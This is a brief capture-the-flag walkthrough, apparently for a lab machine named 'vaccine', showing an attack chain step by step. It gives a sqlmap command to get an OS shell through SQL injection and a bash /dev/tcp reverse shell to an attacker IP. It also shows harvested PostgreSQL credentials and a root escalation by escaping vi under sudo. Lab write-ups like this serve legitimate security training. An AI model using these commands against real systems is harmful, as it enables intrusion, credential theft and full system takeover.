We can use sqlmap to get an os-shell with this command:

`sqlmap -u http://10.10.10.46/dashboard.php?search=asdf --cookie=PHPSESSID=358c77u1tagqmghqqhbe8v4omd  --os-shell`

Once we have command injection we set up a reverse shell with this:

`bash -c 'bash -i &>/dev/tcp/10.10.14.4/4444 <&1'`

Once we get a shell we can check `/var/www/html/dashboard.php`

We find these credentials:
```
"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!"
```


sudo -l reveals this:
```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

With sudo privs for vi, we can just escape out of vi with root priv
```
:set shell=/bin/sh
:shell
```